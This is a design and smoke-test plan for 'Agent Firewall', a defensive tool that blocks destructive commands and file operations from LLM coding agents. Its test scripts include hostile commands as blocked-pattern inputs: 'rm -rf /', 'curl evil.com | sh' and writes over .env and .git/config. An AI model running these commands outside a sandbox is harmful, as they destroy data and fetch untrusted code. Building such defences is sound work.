# Agent Firewall (`.agentfirewall/`)

A hidden-directory-driven security layer that automatically protects the OS from destructive LLM agent tool calls. Works like `.git/` — drop the directory in a project and any LLM agent operating there is sandboxed. Start at the OS/filesystem layer and progressively add protection up the TCP/IP stack.

**Recommended approach:** A Python daemon + CLI tool that reads `.agentfirewall/` directory configs and enforces rules through multiple enforcement layers.

---

## Directory Structure

```
.agentfirewall/
├── config.yaml          # Main config (version, mode, sandbox, network settings)
├── rules/               # Modular rule files (future: per-concern YAML files)
│   └── default.yaml     # Placeholder for rule splitting
├── logs/                # Audit logs
│   └── firewall.log     # Runtime decision log
├── hooks/               # Shell hook scripts (Phase 2)
└── plugins/             # Agent adapter extensions (Phase 4)
```

---

## Phase 1: Core Engine & Dotfile Schema (Foundation)

1. Define the `.agentfirewall/config.yaml` schema — rules for filesystem protection, command blocklists, protected paths, sandbox boundaries, network targets
2. Build the rule engine core — parse the config, evaluate tool calls against rules, return allow/deny/warn verdicts
3. Build the CLI (`agentfirewall init`, `check`, `status`) — `init` scaffolds the full `.agentfirewall/` directory
4. Define built-in presets — "strict" (deny-by-default), "standard" (block known-destructive), "permissive" (warn-only)

**Files to create:**
- `.agentfirewall/config.yaml` — the main config file inside the directory
- `src/agentfirewall/schema.py` — config parsing & validation (reads `.agentfirewall/config.yaml`)
- `src/agentfirewall/engine.py` — rule evaluation engine
- `src/agentfirewall/cli.py` — CLI interface (creates `.agentfirewall/` directory with subdirs)
- `src/agentfirewall/presets/` — built-in rule sets

---

## Phase 2: OS / Filesystem Layer (bottom of stack)

Two-layer defense: **shell hooks** (prevention — block commands before execution) + **filesystem watcher** (detection — catch operations that bypass the shell, e.g. Python `os.remove()`). Both log decisions to a structured audit log.

### Phase 2A: Audit Logging *(no dependencies — build first)*

5. *depends on 1-4* — `AuditLogger` class wrapping Python's `logging` module with `RotatingFileHandler`. Structured JSON log entries (one per line) to `.agentfirewall/logs/firewall.log`: `{"timestamp", "action_type", "target", "verdict", "rule", "detail"}`. Respects `LoggingConfig` settings (enabled, file, level). Wired into `Engine` as optional parameter (existing tests unaffected).

### Phase 2B: Filesystem Watcher *(depends on 2A)*

6. *depends on 5* — Single cross-platform filesystem watcher using `watchdog` (abstracts `inotify`/`fsevents` internally). `FirewallHandler(FileSystemEventHandler)` maps watchdog events to engine evaluations: `FileDeletedEvent` → `DELETE`, `FileModifiedEvent` → `WRITE`, `FileMovedEvent` → `MOVE_OUTSIDE_SANDBOX`. Ignores events inside `.agentfirewall/` itself.
7. *depends on 6* — `ProcessKiller` module with two kill scopes (configured via `filesystem.kill_scope`):
   - `agents` (default) — scans running processes via `psutil` for known LLM agent signatures (`node`/`code`, `claude`, `cursor`, `copilot-agent`, `windsurf`), kills matching ones. Cross-platform.
   - `all` — on Linux, uses `fanotify` to get the exact PID that caused the filesystem event, kills that process directly. On macOS, falls back to `agents` mode with a warning. Requires elevated privileges on some systems.
   - Safety guards (both modes): never kill PID 1, self, or firewall process. Graceful skip on `AccessDenied`.
8. Protected path enforcement — `.git/`, `.env`, `.ssh/`, system dirs immutable by default; config can add custom globs *(already implemented in engine, watcher connects it to real-time events)*
9. Sandbox boundary enforcement — operations outside the sandbox root are flagged/blocked *(already implemented in engine, watcher connects it to real-time events)*

### Phase 2C: Shell Preexec Hooks *(parallel with 2B, depends on 2A)*

10. *parallel with 6-7* — Shell preexec hooks: bash `DEBUG` trap / zsh `preexec` + `add-zsh-hook` that call `agentfirewall check` before each command. Guard markers (`# BEGIN/END agentfirewall`) for idempotent install/uninstall.

### Phase 2D: CLI Commands *(depends on 2A-C)*

11. `agentfirewall watch [--path PATH] [--recursive/--no-recursive] [--kill-scope agents|all]` — foreground filesystem watcher (Ctrl+C to stop). Loads engine + AuditLogger + ProcessKiller. `--kill-scope` overrides config for this session.
12. `agentfirewall install-hooks [--shell bash|zsh|auto] [--print]` — installs preexec hook to RC file, or `--print` to stdout for manual use.
13. `agentfirewall uninstall-hooks [--shell bash|zsh|auto]` — removes the guard-marked hook block from RC file.

**Design decisions:**
- Single `watchers/filesystem.py` (not separate inotify/fsevents files — watchdog abstracts this)
- Kill scope configurable: `agents` (default, known LLM agents only) or `all` (any responsible process via fanotify on Linux)
- Foreground watch command (not daemon)
- `psutil` new dependency for cross-platform process management
- `sandbox.py` deferred — engine already handles sandbox boundaries
- Guard markers for idempotent hook install/uninstall

**Files to create:**
- `src/agentfirewall/audit.py` — structured JSON audit logging with `RotatingFileHandler`
- `src/agentfirewall/watchers/filesystem.py` — cross-platform watchdog-based filesystem watcher
- `src/agentfirewall/process.py` — LLM agent process identification and termination
- `src/agentfirewall/hooks/shell.py` — bash/zsh preexec hook generation, install, uninstall
- `tests/test_audit.py` — audit logger tests
- `tests/test_watcher.py` — filesystem watcher tests
- `tests/test_process.py` — process killer tests
- `tests/test_hooks.py` — shell hook tests
- `tests/test_cli_phase2.py` — new CLI command tests

**Files to modify:**
- `src/agentfirewall/engine.py` — add optional `audit: AuditLogger` parameter
- `src/agentfirewall/cli.py` — add `watch`, `install-hooks`, `uninstall-hooks` commands
- `pyproject.toml` — add `psutil>=5.9` dependency

---

## Phase 2E: Integration & Smoke Testing *(depends on 2A-D, gate before Phase 3)*

End-to-end validation with a real `.agentfirewall/` dotfile directory. All tests below should be run in a secured/sandboxed environment. Unit tests verify code logic; this phase verifies the **product works**.

### Core files under test

| # | File | What it does | Depends on |
|---|------|-------------|------------|
| 1 | `src/agentfirewall/schema.py` | Parses `.agentfirewall/config.yaml`, validates rules | — |
| 2 | `src/agentfirewall/engine.py` | Evaluates commands/files/network against rules, returns verdicts | schema.py |
| 3 | `src/agentfirewall/audit.py` | Writes JSON log entries to `.agentfirewall/logs/firewall.log` | engine.py (RuleResult) |
| 4 | `src/agentfirewall/process.py` | Finds and kills known LLM agent processes | psutil |
| 5 | `src/agentfirewall/watchers/filesystem.py` | Watches filesystem events, triggers engine + killer | engine.py, process.py, audit.py |
| 6 | `src/agentfirewall/hooks/shell.py` | Generates/installs bash/zsh preexec hooks | — |
| 7 | `src/agentfirewall/cli.py` | CLI commands that tie everything together | all of the above |

### Test 1: Dotfile initialization
```bash
cd /tmp/test-firewall && mkdir -p /tmp/test-firewall && cd /tmp/test-firewall
agentfirewall init --preset standard
```
**Validate:**
- `.agentfirewall/` directory exists with subdirs: `rules/`, `logs/`, `hooks/`, `plugins/`
- `.agentfirewall/config.yaml` exists, is valid YAML, contains `mode: enforce`
- `agentfirewall status` prints mode, blocklist count, protected paths count

### Test 2: Command evaluation + audit logging (engine.py + audit.py)
```bash
agentfirewall check "rm -rf /"
echo $?   # should be 1 (blocked)
agentfirewall check "ls -la"
echo $?   # should be 0 (allowed)
cat .agentfirewall/logs/firewall.log | head -2
```
**Validate:**
- `check "rm -rf /"` outputs 🚫 DENY and exits 1
- `check "ls -la"` outputs ✅ ALLOW and exits 0
- `firewall.log` contains JSON entries — parse each line with `python3 -c "import json,sys; [json.loads(l) for l in sys.stdin]" < .agentfirewall/logs/firewall.log`
- Each entry has all 6 fields: `timestamp`, `action_type`, `target`, `verdict`, `rule`, `detail`
- The DENY entry has `"verdict": "deny"` and `"action_type": "command"`

### Test 3: File operation evaluation (engine.py + audit.py)
```bash
agentfirewall check-file .git/config --operation delete
echo $?   # should be 1
agentfirewall check-file README.md --operation write
echo $?   # should be 0
cat .agentfirewall/logs/firewall.log | tail -2
```
**Validate:**
- Delete on `.git/config` → DENY (protected path)
- Write on `README.md` → ALLOW
- Both logged to `firewall.log` with `"action_type": "file"`

### Test 4: Network evaluation (engine.py + audit.py)
```bash
agentfirewall check-network 169.254.169.254
echo $?   # should be 1
agentfirewall check-network github.com
echo $?   # should be 0
```
**Validate:**
- Metadata endpoint → DENY
- Allowed host → ALLOW
- Both logged with `"action_type": "network"`

### Test 5: Filesystem watcher (watchers/filesystem.py + process.py)
```bash
# Terminal 1: start the watcher
agentfirewall watch

# Terminal 2: trigger violations
touch .git/test-file          # should trigger WRITE on protected path
rm .git/test-file             # should trigger DELETE on protected path
echo "test" >> .env           # should trigger WRITE on protected path

# Terminal 2: trigger allowed operation
touch README.md               # should NOT produce any output in Terminal 1
```
**Validate:**
- Watcher prints violation alerts to **stderr** in Terminal 1 for each protected-path event
- Each violation alert shows: emoji verdict (🚫), DENY, operation type, file path, rule, and detail
- Example output: `🚫  [DENY] delete on /path/.git/test-file\n   Rule:   protected_path\n   Detail: ...`
- When a process is killed, watcher prints `Killed N agent process(es)` to stderr
- `.agentfirewall/logs/firewall.log` has new JSON entries for each violation
- Watcher does NOT print anything for changes to normal files (e.g. `touch README.md`)
- Watcher does NOT alert on changes inside `.agentfirewall/` itself (no self-trigger)
- Ctrl+C stops the watcher cleanly with `Stopping watcher...` message

### Test 6: Process killer (process.py)
```bash
# Start a fake "agent" process
node -e "setInterval(()=>{}, 1000)" &
NODE_PID=$!

# Trigger watcher violation (watcher should kill the node process)
# In another terminal with watcher running:
rm .git/test-file

# Check if node process was killed
kill -0 $NODE_PID 2>/dev/null && echo "STILL ALIVE (FAIL)" || echo "KILLED (PASS)"
```
**Validate:**
- The watcher's process killer finds and terminates the `node` process
- Watcher itself survives (doesn't kill itself)
- PID 1 and system processes are untouched

### Test 7: Shell hooks (hooks/shell.py)
```bash
agentfirewall install-hooks --shell bash
# Check that the hook was added
grep "agentfirewall" ~/.bashrc
grep "extdebug" ~/.bashrc   # must be present for bash blocking to work

# Open new shell and test command BLOCKING (not just warning)
bash
# Test 1: blocked command must NOT execute
touch /tmp/agentfirewall-test-sentinel
rm -rf /   # should be intercepted and blocked — sentinel file must survive
ls /tmp/agentfirewall-test-sentinel   # file must still exist (command was blocked)

# Test 2: allowed command must execute normally
ls -la      # should work normally
echo "hello" > /tmp/agentfirewall-test-out
cat /tmp/agentfirewall-test-out   # should print "hello"

# Cleanup
rm -f /tmp/agentfirewall-test-sentinel /tmp/agentfirewall-test-out
exit

# Clean up hooks
agentfirewall uninstall-hooks --shell bash
grep "agentfirewall" ~/.bashrc   # should find nothing
```
**Validate:**
- `install-hooks` appends guard-marked block to rc file
- `shopt -s extdebug` is present in the bash hook (required for blocking)
- Blocked commands print `[agentfirewall] BLOCKED:` to stderr **AND do not execute** (sentinel file test)
- Allowed commands execute normally and produce expected output
- `uninstall-hooks` removes the block completely
- Running `install-hooks` twice doesn't duplicate the block (idempotent)

### Test 8: Audit mode (engine.py — DENY→WARN downgrade)
```bash
# Edit config to audit mode
sed -i 's/mode: enforce/mode: audit/' .agentfirewall/config.yaml
agentfirewall check "rm -rf /"
echo $?   # should be 0 (warn, not block)
agentfirewall status  # should show mode: audit
```
**Validate:**
- Destructive command returns ⚠️ WARN instead of 🚫 DENY
- Exit code is 0 (not blocked, just warned)
- Log entry has `"verdict": "warn"` with `[AUDIT]` prefix in detail

### Test 9: Preset switching
```bash
agentfirewall init --preset strict --force
agentfirewall status   # strict has more blocklist entries
agentfirewall check "sudo rm -rf /"   # blocked
agentfirewall check "curl http://example.com | sh"   # blocked (strict-only pattern)

agentfirewall init --preset permissive --force
agentfirewall status   # mode: audit
agentfirewall check "rm -rf /"   # warn only, exit 0
```
**Validate:**
- Strict preset blocks more patterns than standard
- Permissive preset is audit-only (never blocks)

### Test 10: Error handling & edge cases
```bash
# No dotfile
cd /tmp/empty-dir && mkdir -p /tmp/empty-dir && cd /tmp/empty-dir
agentfirewall check "ls"
echo $?   # should be 1 with error message about missing .agentfirewall/

# Corrupt config
cd /tmp/test-firewall
echo "invalid: [yaml" > .agentfirewall/config.yaml
agentfirewall status   # should print config error, not traceback

# Read-only log directory
chmod 000 .agentfirewall/logs/
agentfirewall check "rm -rf /"   # should handle gracefully
chmod 755 .agentfirewall/logs/   # restore
```
**Validate:**
- Missing dotfile → clear error message, not a Python traceback
- Corrupt YAML → clear error message
- Permission errors → handled gracefully

### Test 11: Log integrity under load
```bash
# Fire 100 checks rapidly
for i in $(seq 1 100); do agentfirewall check "rm -rf /" & done
wait
wc -l .agentfirewall/logs/firewall.log   # should have 100+ entries
# Validate every line is valid JSON
python3 -c "
import json, sys
with open('.agentfirewall/logs/firewall.log') as f:
    for i, line in enumerate(f, 1):
        try:
            json.loads(line)
        except:
            print(f'CORRUPT LINE {i}: {line!r}')
            sys.exit(1)
print(f'All {i} lines valid')
"
```
**Validate:**
- No corrupted/partial JSON lines
- Line count matches expected number of log entries

### Cleanup
```bash
agentfirewall uninstall-hooks --shell bash
rm -rf /tmp/test-firewall /tmp/empty-dir
```

---

## Phase 2F: FUSE Sandbox — True Prevention *(depends on 2A-D, parallel with 2E)*

The watcher (Phase 2B) is **reactive** — it detects file operations after they happen and retaliates by killing agent processes. The first file operation always goes through. For true prevention (blocking the syscall *before* the file is touched), the project needs a FUSE (Filesystem in Userspace) overlay that intercepts every mutating filesystem operation and evaluates it against the engine **before** allowing it to reach the real filesystem.

This is the layer that stops **all** agents — interactive terminal agents (Copilot, Cursor), subprocess-based agents (Claude Code, OpenClaw, LangChain), and anything else that touches the filesystem — because FUSE operates at the kernel VFS level. The agent's process receives a `PermissionError` and the file is never touched.

```
Without FUSE (current — reactive):
  Agent calls unlink(".git/config") → kernel deletes file → inotify fires → watcher logs + kills agent
  Result: file already gone ❌

With FUSE (preventive):
  Agent calls unlink(".git/config") → FUSE intercepts → engine evaluates → DENY → returns -EPERM
  Result: file untouched, agent gets PermissionError ✅
```

### Phase 2F-1: FUSE Passthrough Overlay

13f-1. *depends on 1-4, engine.py* — `sandbox.py` module implementing a FUSE passthrough filesystem that wraps a real directory:
    - **`FirewallFS`** class extending `fuse.Operations` (from `fusepy`):
      - **Read operations** (`getattr`, `readdir`, `open` for read, `read`) — pass through directly to the underlying real filesystem, no overhead
      - **Mutating operations** intercepted and evaluated against the engine:
        - `unlink(path)` → evaluate as `DenyOperation.DELETE` on the path
        - `write(path, data, offset, fh)` → evaluate as `DenyOperation.WRITE` on the path (only on first write per file handle, not every chunk)
        - `rename(old, new)` → evaluate as `DenyOperation.MOVE_OUTSIDE_SANDBOX` if destination is outside sandbox root
        - `chmod(path, mode)` → evaluate as `DenyOperation.CHMOD` on the path
        - `truncate(path, length)` → evaluate as `DenyOperation.WRITE` on the path
        - `rmdir(path)` → evaluate as `DenyOperation.DELETE` on the path
        - `mkdir`, `symlink`, `link` → pass through (creating new files is generally allowed; protected by path rules)
      - If engine returns `DENY` → return `-errno.EACCES` (or `-errno.EPERM`)
      - If engine returns `ALLOW` or `WARN` → forward to real filesystem
      - All decisions logged via `AuditLogger` (same structured JSON as watcher)
    - Path translation: FUSE mount path → real underlying path (e.g., `/tmp/agentfirewall-mount/project/.git/config` → `/home/user/project/.git/config`)
    - Self-protection: `.agentfirewall/` directory itself is **read-only** through FUSE (config tampering prevention)

13f-2. Mount lifecycle management:
    - `mount(source: Path, mountpoint: Path, engine: Engine, audit: AuditLogger | None) -> FirewallFS` — mounts the FUSE overlay
    - `unmount(mountpoint: Path)` — safely unmounts via `fusermount -u`
    - Signal handling: `SIGTERM`/`SIGINT` trigger clean unmount
    - Stale mount detection: check if mountpoint is already a FUSE mount before mounting, auto-cleanup if stale

### Phase 2F-2: CLI Command

13f-3. `agentfirewall sandbox [command...] [--mountpoint PATH]`
    - Creates a temporary mountpoint (default: `/tmp/agentfirewall-<hash>/`)
    - Mounts the FUSE overlay over the project directory (where `.agentfirewall/config.yaml` lives)
    - If `[command...]` is provided: runs the command with `CWD` set to the mountpoint, waits for exit, then unmounts
    - If no command: prints the mountpoint path and keeps running (Ctrl+C to unmount). User can `cd` into it or point agents at it.
    - `--mountpoint PATH` overrides the default temp directory
    - Exit cleanup: always unmounts, even on crash (via `atexit` + signal handlers)

    ```bash
    # Run a LangChain agent inside the sandbox
    agentfirewall sandbox python3 rogue_agent.py

    # Or: start sandbox, use mountpoint in another terminal
    agentfirewall sandbox
    # Prints: Sandbox mounted at /tmp/agentfirewall-a1b2c3/
    # In another terminal: cd /tmp/agentfirewall-a1b2c3/ && python3 rogue_agent.py
    ```

### Phase 2F-3: Integration with Existing Layers

13f-4. FUSE + watcher coexistence:
    - When `agentfirewall sandbox` is running, the watcher is **not needed** for the mounted tree (FUSE handles prevention). But the watcher can still run on the real directory as a redundant layer.
    - Shell hooks remain useful for commands that don't touch files (e.g., `curl evil.com | sh` — FUSE only sees filesystem ops, not network)
    - Audit logger shared between FUSE, watcher, and hooks — all decisions go to the same `firewall.log`

**Design decisions:**
- **`fusepy` over `llfuse`** — `fusepy` is simpler, pure Python, fewer build dependencies. `llfuse` is faster but requires C compilation. For a security tool where correctness > throughput, `fusepy` is the right choice.
- **FUSE as optional dependency** — `pip install agentfirewall[sandbox]` (like Flask for UI). Core CLI still works without FUSE. Graceful error if `fusepy` not installed.
- **Passthrough design** — not a copy-on-write or union mount. Allowed writes go directly to the real filesystem. This means no data duplication and no sync issues.
- **First-write-per-handle evaluation** — evaluating every `write()` chunk would be too expensive. Evaluate on `open(O_WRONLY/O_RDWR)` or first `write()` call, then cache the verdict for that file handle.
- **Linux + macOS** — `fusepy` works on both (Linux: native FUSE, macOS: macFUSE). No root required if FUSE is installed.
- **Self-protection** — `.agentfirewall/` is read-only through the mount. An agent can't modify firewall config to weaken rules.

**Files to create:**
- `src/agentfirewall/sandbox.py` — `FirewallFS(fuse.Operations)` passthrough, mount/unmount lifecycle, path translation
- `tests/test_sandbox.py` — ~15-20 tests: FUSE operations evaluate against engine, DENY returns EACCES, ALLOW passes through, read ops have no overhead, self-protection of `.agentfirewall/`, mount/unmount lifecycle, stale mount cleanup

**Files to modify:**
- `src/agentfirewall/cli.py` — add `sandbox` command
- `pyproject.toml` — add `sandbox = ["fusepy>=3.0"]` to `[project.optional-dependencies]`

---

## Phase 2G: FUSE Sandbox Integration & Smoke Testing *(depends on 2F, run in secured environment)*

End-to-end validation of the FUSE sandbox with real filesystem operations. These tests prove that **no file is harmed** — the operation is blocked before it reaches the real filesystem. All tests should be run in a secured/sandboxed environment (ironic, but necessary for safety).

**Prerequisites:** FUSE installed (`sudo apt install fuse3` on Debian/Ubuntu, `brew install macfuse` on macOS), `fusepy` installed (`pip install fusepy>=3.0`).

### Test 1: Basic FUSE mount lifecycle
```bash
cd /tmp/fuse-test && mkdir -p /tmp/fuse-test && cd /tmp/fuse-test
agentfirewall init --preset standard

# Start sandbox in background
agentfirewall sandbox &
SANDBOX_PID=$!
sleep 2
# Read the mountpoint from output (or use default)
MOUNT=$(ls -d /tmp/agentfirewall-*/  2>/dev/null | head -1)

# Verify mount exists and is readable
ls "$MOUNT"                     # should list project files
cat "$MOUNT/README.md"          # should work (read-only op)

# Cleanup
kill $SANDBOX_PID
wait $SANDBOX_PID 2>/dev/null
# Verify unmounted
mount | grep agentfirewall      # should find nothing
```
**Validate:**
- Mountpoint created and accessible
- Read operations work normally
- Clean unmount on `SIGTERM`
- No stale mounts left behind

### Test 2: FUSE blocks deletion of protected files
```bash
agentfirewall sandbox &
SANDBOX_PID=$!
sleep 2
MOUNT=$(ls -d /tmp/agentfirewall-*/  2>/dev/null | head -1)

# Create a protected file
echo "important" > .git/config

# Through the FUSE mount, try to delete it
rm "$MOUNT/.git/config" 2>&1
echo $?   # should be non-zero (Permission denied)

# Verify the real file is untouched
cat .git/config   # should still print "important"

kill $SANDBOX_PID
```
**Validate:**
- `rm` fails with "Permission denied" or "Operation not permitted"
- Real file `.git/config` is completely untouched
- `firewall.log` has a DENY entry for the delete attempt

### Test 3: FUSE blocks writes to protected files
```bash
agentfirewall init --preset strict   # strict denies WRITE on protected paths
agentfirewall sandbox &
SANDBOX_PID=$!
sleep 2
MOUNT=$(ls -d /tmp/agentfirewall-*/  2>/dev/null | head -1)

echo "pwned" > "$MOUNT/.env" 2>&1
echo $?   # should be non-zero

cat .env   # should be unchanged (or not exist)

kill $SANDBOX_PID
```
**Validate:**
- Write to `.env` via FUSE mount is blocked
- Real `.env` file is untouched

### Test 4: FUSE allows normal operations
```bash
agentfirewall sandbox &
SANDBOX_PID=$!
sleep 2
MOUNT=$(ls -d /tmp/agentfirewall-*/  2>/dev/null | head -1)

# These should all succeed through the FUSE mount
echo "hello" > "$MOUNT/temp.txt"     # ALLOW (not protected)
cat "$MOUNT/temp.txt"                 # ALLOW (read)
rm "$MOUNT/temp.txt"                  # ALLOW (not protected path)
mkdir "$MOUNT/newdir"                 # ALLOW
ls "$MOUNT/"                          # ALLOW

kill $SANDBOX_PID
```
**Validate:**
- Normal file operations on non-protected paths work through the mount
- Created files appear on the real filesystem
- No false positives

### Test 5: FUSE stops Python subprocess attack (LangChain/OpenClaw scenario)
```bash
agentfirewall sandbox &
SANDBOX_PID=$!
sleep 2
MOUNT=$(ls -d /tmp/agentfirewall-*/  2>/dev/null | head -1)

# Simulate a rogue LangChain agent running inside the sandbox
echo "important" > .git/config
python3 -c "
import os
os.chdir('$MOUNT')
try:
    os.remove('.git/config')
    print('FAIL: file was deleted')
except PermissionError:
    print('PASS: PermissionError — file protected')
except OSError as e:
    print(f'PASS: OSError — {e}')
"

# Verify real file
cat .git/config   # must still print "important"

kill $SANDBOX_PID
```
**Validate:**
- Python `os.remove()` through the FUSE mount gets `PermissionError`
- This is the **key demo**: proves FUSE prevents subprocess-based agents (LangChain, OpenClaw, Claude Code) from touching protected files
- Real file untouched

### Test 6: FUSE self-protection (config tampering)
```bash
agentfirewall sandbox &
SANDBOX_PID=$!
sleep 2
MOUNT=$(ls -d /tmp/agentfirewall-*/  2>/dev/null | head -1)

# Try to weaken the firewall config through the mount
echo "mode: off" > "$MOUNT/.agentfirewall/config.yaml" 2>&1
echo $?   # should fail

# Verify config is unchanged
agentfirewall status   # should still show mode: enforce

kill $SANDBOX_PID
```
**Validate:**
- `.agentfirewall/` directory is read-only through the FUSE mount
- An agent cannot modify the firewall's own config to disable protection

### Test 7: FUSE + audit logging
```bash
agentfirewall sandbox &
SANDBOX_PID=$!
sleep 2
MOUNT=$(ls -d /tmp/agentfirewall-*/  2>/dev/null | head -1)

# Trigger several operations
rm "$MOUNT/.git/config" 2>/dev/null            # DENY
echo "x" > "$MOUNT/.env" 2>/dev/null           # DENY
echo "ok" > "$MOUNT/safe.txt"                   # ALLOW
rm "$MOUNT/safe.txt"                            # ALLOW

kill $SANDBOX_PID

# Check audit log
python3 -c "
import json
with open('.agentfirewall/logs/firewall.log') as f:
    for line in f:
        entry = json.loads(line)
        print(f\"{entry['verdict']:5s} {entry['action_type']:5s} {entry['target']}\")
"
```
**Validate:**
- All FUSE decisions (DENY and ALLOW) logged to `firewall.log`
- Same JSON format as watcher/CLI entries
- Each entry has all 6 fields: `timestamp`, `action_type`, `target`, `verdict`, `rule`, `detail`

### Test 8: `agentfirewall sandbox [command]` mode
```bash
echo "important" > .git/config

agentfirewall sandbox python3 -c "
import os
try:
    os.remove('.git/config')
    print('FAIL')
except (PermissionError, OSError):
    print('PASS')
"
# sandbox auto-unmounts after command exits

# Verify
cat .git/config          # must still exist
mount | grep agentfirewall   # must find nothing (auto-unmounted)
```
**Validate:**
- Command runs with CWD inside the FUSE mount
- Protected files blocked
- FUSE auto-unmounts when command exits
- Clean exit, no stale mounts

### Cleanup
```bash
# Kill any leftover sandbox processes
pkill -f "agentfirewall sandbox" 2>/dev/null
# Clean up stale FUSE mounts
mount | grep agentfirewall | awk '{print $3}' | xargs -I{} fusermount -u {} 2>/dev/null
rm -rf /tmp/fuse-test /tmp/agentfirewall-*
```

---

## Phase 2H: Protect / Unprotect Smoke Testing *(depends on 2A-D, gate before Phase 3)*

The `protect` and `unprotect` commands are the **primary user-facing entry point** for the entire firewall. While Phases 2E and 2G validated individual enforcement layers (watcher, hooks, FUSE sandbox), `protect` is the command that orchestrates all of them into a single one-step activation. If `protect` fails silently or leaves partial state, a user who thinks they're protected is actually exposed — the most dangerous failure mode for a security tool.

Unit tests (in `tests/test_cli_protect.py`) mock subprocess and signal calls to verify logic in isolation. This phase validates the **real end-to-end orchestration**: does `protect` actually start a working watcher? Does `unprotect` actually stop it? Does the self-test detect real violations? These are the gaps where integration failures hide.

**Prerequisites:** All Phase 2A-D tests passing, shell hooks functional, watcher functional.

**Files under test:**
- `src/agentfirewall/cli.py` — `protect()` and `unprotect()` Click commands
- `src/agentfirewall/hooks/shell.py` — `install_hook()`, `uninstall_hook()`, `detect_shell()`
- `src/agentfirewall/watchers/filesystem.py` — background watcher process
- `.agentfirewall/watcher.pid` — PID file lifecycle

### Test 1: `protect` full lifecycle
```bash
cd /tmp && mkdir -p protect-test && cd protect-test
agentfirewall protect --preset standard
echo $?   # should be 0
```
**Validate:**
- `.agentfirewall/` directory exists with all subdirs (`rules/`, `logs/`, `hooks/`, `plugins/`)
- `.agentfirewall/config.yaml` exists and contains `mode: enforce`
- `.agentfirewall/watcher.pid` exists and contains a valid PID
- Output includes all 5 checkmarks: initialized, hooks installed, watcher running, self-test DENY, protection active
- `ps -p $(cat .agentfirewall/watcher.pid)` shows a live process

### Test 2: Watcher is actually running
```bash
# Continuing from Test 1 — watcher should be active
WATCHER_PID=$(cat .agentfirewall/watcher.pid)
ps -p $WATCHER_PID -o comm=   # should show "python" or similar

# Create a protected file and trigger a violation
mkdir -p .git && echo "important" > .git/config
rm .git/config 2>/dev/null
sleep 1

# Check that the watcher logged the event
cat .agentfirewall/logs/firewall.log | python3 -c "
import json, sys
for line in sys.stdin:
    entry = json.loads(line)
    if entry.get('verdict') == 'deny' and '.git' in entry.get('target', ''):
        print(f\"PASS: watcher caught violation — {entry['verdict']} on {entry['target']}\")
        sys.exit(0)
print('FAIL: no deny entry for .git/ found in logs')
sys.exit(1)
"
```
**Validate:**
- Background watcher process is alive and responsive
- Filesystem violations are detected and logged to `firewall.log`
- The watcher started by `protect` is functionally identical to `agentfirewall watch`

### Test 3: Self-test verification
```bash
cd /tmp && mkdir -p protect-selftest && cd protect-selftest
agentfirewall protect 2>&1 | grep -i "self-test"
```
**Validate:**
- Output contains `Self-test: "rm -rf /" → DENY`
- If the self-test ever reports "not blocked", the preset config is broken — this is a critical safety gate

### Test 4: `protect --preset strict`
```bash
cd /tmp && mkdir -p protect-strict && cd protect-strict
agentfirewall protect --preset strict
agentfirewall status
```
**Validate:**
- Config file contains strict-mode settings (more blocklist entries, deny-by-default patterns)
- `agentfirewall status` reflects strict configuration
- Self-test still reports DENY

### Test 5: `protect` fails if already protected
```bash
cd /tmp/protect-test   # already has .agentfirewall/ from Test 1
agentfirewall protect
echo $?   # should be 1
```
**Validate:**
- Exit code 1
- Error message says "already exists"
- Existing `.agentfirewall/` is not modified (no data loss)

### Test 6: `protect --force` re-initializes
```bash
cd /tmp/protect-test
agentfirewall protect --force
echo $?   # should be 0
```
**Validate:**
- Re-initializes successfully
- New watcher PID written (old watcher may become orphaned — verify cleanup)
- Config overwritten with fresh preset

### Test 7: `unprotect` full teardown
```bash
cd /tmp/protect-test
WATCHER_PID=$(cat .agentfirewall/watcher.pid)
agentfirewall unprotect
echo $?   # should be 0
```
**Validate:**
- Watcher process is stopped: `ps -p $WATCHER_PID` should fail
- `.agentfirewall/watcher.pid` is removed
- Shell hooks removed from rc file
- Output shows: watcher stopped, hooks removed, protection disabled
- `.agentfirewall/` dir still exists (config preserved for re-protect)

### Test 8: `unprotect --remove-config`
```bash
cd /tmp/protect-strict
agentfirewall unprotect --remove-config
```
**Validate:**
- `.agentfirewall/` directory completely removed
- No leftover PID file, config, or logs

### Test 9: `unprotect` handles already-stopped watcher
```bash
cd /tmp && mkdir -p protect-graceful && cd protect-graceful
agentfirewall protect
kill $(cat .agentfirewall/watcher.pid)   # manually kill watcher
sleep 1
agentfirewall unprotect
echo $?   # should be 0, not crash
```
**Validate:**
- Graceful handling when watcher is already dead
- No Python traceback — warning message only
- Hooks still removed, PID file cleaned up

### Test 10: `protect` → `unprotect` → `protect` cycle
```bash
cd /tmp && mkdir -p protect-cycle && cd protect-cycle
agentfirewall protect
agentfirewall unprotect
agentfirewall protect --force
agentfirewall status
```
**Validate:**
- Full protect/unprotect/re-protect cycle works without errors
- No stale PID files or orphan processes
- Final `status` shows active protection

### Cleanup
```bash
# Stop any leftover watchers
for d in /tmp/protect-test /tmp/protect-strict /tmp/protect-selftest /tmp/protect-graceful /tmp/protect-cycle; do
    [ -f "$d/.agentfirewall/watcher.pid" ] && kill $(cat "$d/.agentfirewall/watcher.pid") 2>/dev/null
done
rm -rf /tmp/protect-test /tmp/protect-strict /tmp/protect-selftest /tmp/protect-graceful /tmp/protect-cycle
```

---

## Phase 3: Agent Discovery & Scan *(depends on Phase 1-2)*

Auto-detect which LLM agents are installed on the system and in the current project. Gives users visibility into what's running before configuring protection. Modeled after Snyk's `well_known_clients.py` but lighter — just path existence checks, no config parsing.

### Phase 3A: Discovery Module

14. *depends on 1-13* — `discovery.py` module with two dataclasses:
    - `AgentSignature`: `name: str`, `global_paths: dict[str, list[str]]` (platform → home-relative paths), `project_paths: list[str]` (project-relative globs)
    - `AgentInfo`: `name: str`, `installed: bool`, `found_paths: list[Path]`, `scope: Literal["global", "project"]`

15. Known agents registry — hardcoded list of `AgentSignature` objects:

    | Agent | Global paths (Linux) | Global paths (macOS) | Project paths |
    |---|---|---|---|
    | Windsurf | `~/.codeium/windsurf/` | `~/.codeium/windsurf/` | — |
    | Cursor | `~/.cursor/` | `~/.cursor/` | `.cursor/` |
    | VS Code / Copilot | `~/.vscode/`, `~/.config/Code/` | `~/.vscode/`, `~/Library/Application Support/Code/` | `.vscode/mcp.json`, `.copilot/` |
    | Claude Desktop | `~/.config/Claude/` | `~/Library/Application Support/Claude/` | — |
    | Claude Code | `~/.claude/` | `~/.claude/` | `.claude/`, `CLAUDE.md` |
    | Gemini CLI | `~/.gemini/` | `~/.gemini/` | `.gemini/` |
